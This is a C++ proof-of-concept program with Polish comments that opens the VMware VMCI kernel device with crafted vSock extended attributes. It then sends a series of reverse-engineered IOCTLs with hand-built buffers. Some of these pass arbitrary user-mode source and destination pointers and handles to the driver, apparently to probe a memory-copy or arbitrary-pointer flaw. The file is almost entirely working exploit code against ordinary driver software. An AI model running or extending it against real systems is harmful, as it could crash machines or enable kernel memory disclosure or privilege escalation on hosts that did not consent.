// POC.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <Windows.h>
#include <iostream>
#include <winternl.h>

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG  NextEntryOffset; //0
    UCHAR  Flags;           //4
    UCHAR  EaNameLength;    //5
    USHORT EaValueLength;   //6
    CHAR   EaName[1];       //8
} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;

class vSock_interface {

    HANDLE dev_;

public:

    explicit vSock_interface() noexcept(true);

    ~vSock_interface() noexcept(true);

    bool open(const WCHAR* dev_name) noexcept(true);

    void close() noexcept(true);

    DWORD ioctl_0x8103207C(void* src, void* dst, DWORD size) noexcept(true);

    DWORD ioctl_0x81032080() noexcept(true);

    DWORD ioctl_0x81032088() noexcept(true);

    DWORD ioctl_0x8103208C(DWORD off_0x8, HANDLE handle) noexcept(true);

    inline HANDLE handler() noexcept(true) {
           return dev_;
    }

    DWORD ioctl_0x81032098(void* mem, DWORD size) noexcept(true);

    DWORD ioctl_0x810320C0() noexcept(true);
 
};

DWORD vSock_interface::ioctl_0x810320C0() noexcept(true) {

    DWORD IO_buffer[0x1C] = { 0 };
    IO_buffer[0] = 0;
    IO_buffer[1] = 0;
    DWORD dw_ret = 0;
    DeviceIoControl(dev_, 0x810320C0, &IO_buffer, 0x1c, &IO_buffer, 0x1c, &dw_ret, NULL);

    return dw_ret;

}

DWORD vSock_interface::ioctl_0x81032098(void* mem, DWORD size) noexcept(true) {

    DWORD dw_ret = 0;

#pragma pack(push, 4)
    struct SystemBuffer {
        DWORD buff_size; //0
        DWORD unknow;   //4
        DWORD unknow2;     //8
        DWORD size;        //0c
        VOID* r3_src_buff; //0x10
       DWORD unknow3[5];
    }IO_buffer;
#pragma pack(pop)

    ZeroMemory(&IO_buffer, sizeof(IO_buffer));
 
    IO_buffer.buff_size = sizeof(IO_buffer);
    IO_buffer.unknow2 = size;
    IO_buffer.size    = size;
    IO_buffer.r3_src_buff = mem;

    DeviceIoControl(dev_, 0x81032098, &IO_buffer, sizeof(IO_buffer), &IO_buffer, sizeof(IO_buffer), &dw_ret, NULL);

    return dw_ret;

}

DWORD vSock_interface::ioctl_0x8103208C(DWORD off_0x8, HANDLE handle) noexcept(true) {
#pragma pack(push, 4)
    struct SystemBuffer {
        DWORD a;       //+0
        DWORD output;  //+4
        long long c;   //+8  //>= 0
        DWORD d;       //+16 (0x10) //ilość 0x14
        SHORT e;   //+20 (0x14)
        struct {
            HANDLE arbitrary_ptr; //+24 (0x18) 
        }nested;
        char padding[0x624 - 34];
    }IO_buffer;
#pragma pack(pop)

    IO_buffer.a = 0x624;
    IO_buffer.output = 0;
    IO_buffer.c = off_0x8;  //0 == ioctl_0x8103208C_SystemBuffer_8_eq_0_sub_140002DF8, !0 == ioctl_0x8103208C_SystemBuffer_8_not_eq_0_sub_140002F10
    IO_buffer.d = 0xc;      //must be <= 0x40
    IO_buffer.e = 31337;
    IO_buffer.nested.arbitrary_ptr = handle;

    ZeroMemory(IO_buffer.padding, sizeof(IO_buffer.padding));

    DWORD dw_ret = 0;
    DeviceIoControl(dev_, 0x8103208C, &IO_buffer, sizeof(IO_buffer), &IO_buffer, sizeof(IO_buffer), &dw_ret, NULL);

    return dw_ret;

}

DWORD vSock_interface::ioctl_0x81032080() noexcept(true) {

    DWORD dw_ret = 0;
    DWORD IO_buffer[3] = { 0 };
    
    IO_buffer[0] = 0xc;

    DeviceIoControl(dev_, 0x81032080, &IO_buffer, 0x0c, &IO_buffer, 0x0c, &dw_ret, NULL);

    return dw_ret;

}

void vSock_interface::close() noexcept(true) {
    if (dev_ != INVALID_HANDLE_VALUE) {
        CloseHandle(dev_);
    }
}

vSock_interface::vSock_interface() noexcept(true) : dev_(INVALID_HANDLE_VALUE) {
     
}

vSock_interface::~vSock_interface() noexcept(true) {
    close();
}

bool vSock_interface::open(const WCHAR* dev_name) noexcept(true) {

    UNICODE_STRING device_name;
    OBJECT_ATTRIBUTES object;

    RtlInitUnicodeString(&device_name, dev_name);
    InitializeObjectAttributes(&object, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK io_status = { 0 };

    BYTE eas[0x30] = { 0 };
    FILE_FULL_EA_INFORMATION* eap =  reinterpret_cast<FILE_FULL_EA_INFORMATION*>(&eas[0]);

    eap->NextEntryOffset = 0;
    eap->Flags = 0;
    eap->EaNameLength = 7; 
    eap->EaValueLength = 0x20;

    union {
#pragma pack(2)
        struct EAVALUES {
            short family_;
            short type_;
            short protocol_;
        }*Ea_values;
#pragma pack(pop)
        BYTE* Raw_values;
    };                       

    Raw_values = eas + 16;

    Ea_values->family_   = 0x1c;
    Ea_values->type_     = 1; 
    Ea_values->protocol_ = 0;

    std::cout << "Familt " << Ea_values->family_ << std::endl;

    NTSTATUS status = NtCreateFile(&dev_, 
                                   FILE_GENERIC_READ | FILE_GENERIC_WRITE /*0x0C0000000*/, 
                                   &object, &io_status,
                                   NULL, FILE_ATTRIBUTE_NORMAL,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, 
                                   FILE_NON_DIRECTORY_FILE, &eas[0], 0x30); 
    
    return (SUCCEEDED(status)) ? true : false;

}

DWORD vSock_interface::ioctl_0x81032088() noexcept(true) {

    DWORD dw_ret = 0;

    DWORD IO_buffer[14] = { 0 };

    IO_buffer[0] = 0x38;

    DeviceIoControl(dev_, 0x81032088, &IO_buffer, sizeof(IO_buffer), &IO_buffer, sizeof(IO_buffer), &dw_ret, NULL);

    return dw_ret;

}

DWORD vSock_interface::ioctl_0x8103207C(void* src, void* dst, DWORD size) noexcept(true) {

    //maksymalny rozmiar 60 bajtow 
    //minimalny 4 - zależnie od parametrów
    //per call

#pragma pack(push, 4)
    struct SystemBuffer {
        DWORD unused;
        DWORD returned;
        DWORD off_0x8;   //0xFFFF || 0x1C (chcemy 0x1C :D) kopij do 60 bajtów else 4 bajty
        DWORD off_0xc;   //0x8004667E || 0x3E8 (chemy 0x3E8)
        struct _off_0x10 {
            DWORD unused;       //0x00
            DWORD off_0x4;      //0x04
            VOID* unknow;       //0x08
            VOID* r3_src_addr;  //0x10
        }off_0x10;
        DWORD padding;
        struct _off_0x2c {
            DWORD unused;       //0x00
            DWORD off_0x4;      //0x04
            VOID* unknow;       //0x08
            VOID* r3_dst_addr;  //0x10
        }off_0x2c;
        DWORD unknow;
    }IO_buffer;
#pragma pack(pop)

    IO_buffer.unused = 0x48;
    IO_buffer.returned = 0;
    IO_buffer.off_0x8 = 0x1c; 
    IO_buffer.off_0xc = 0x3E8;
    IO_buffer.off_0x10.off_0x4 = 0x1c + 0x20;
    IO_buffer.off_0x10.unknow = nullptr;
    IO_buffer.off_0x10.unused = 0;
    IO_buffer.off_0x10.r3_src_addr = src; 

    IO_buffer.off_0x2c.unused = 0x66778899;
    IO_buffer.off_0x2c.unknow = nullptr;
    IO_buffer.off_0x2c.off_0x4 = 0x3c;
    IO_buffer.off_0x2c.r3_dst_addr = dst;
    DWORD dw_ret = 0;

    DeviceIoControl(dev_, 0x8103207C, &IO_buffer, sizeof(IO_buffer), &IO_buffer, sizeof(IO_buffer), &dw_ret, NULL);

    return dw_ret;

}


int main(int argc, char** argv)
{

    vSock_interface vSock;
    if (vSock.open(L"\\??\\VMCI")) {
        std::cout << "[+]. \\??\\VMCI opened with EA's\r\n";

        void* src = VirtualAlloc(NULL, 60, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        void* dst = VirtualAlloc(NULL, 60, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        ZeroMemory(src, 60);
        ZeroMemory(dst, 60);

        src = GetModuleHandle(NULL);

        DWORD ret = vSock.ioctl_0x8103207C(src, dst, 120);

        std::cout << "[+]. Copied memory via ioctl:0x8103207C dst = " << reinterpret_cast<char*>(dst) <<" ret: "<<ret<< std::endl;

        ret = vSock.ioctl_0x81032080();

        std::cout << "[+]. Call ioctl:0x81032080 ret: "<<ret << std::endl;

        ret = vSock.ioctl_0x81032088();

        std::cout << "[+]. Call ioctl:0x81032088 ret: " << ret << std::endl;

        ret = vSock.ioctl_0x8103208C(1, vSock.handler());

        std::cout << "[+]. Call ioctl:0x8103208C ret: " << ret << std::endl;

        ret = vSock.ioctl_0x81032098(GetModuleHandle(NULL), 0x1c);

        std::cout << "[+]. Call ioctl:0x81032098 ret: " << ret <<" lst err "<<GetLastError()<<" "<< std::endl;

        ret = vSock.ioctl_0x810320C0();

        std::cout << "[+]. Call ioctl:0x810320C0 ret: " << ret << " lst err " << GetLastError() << " " << std::endl;

    }


}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
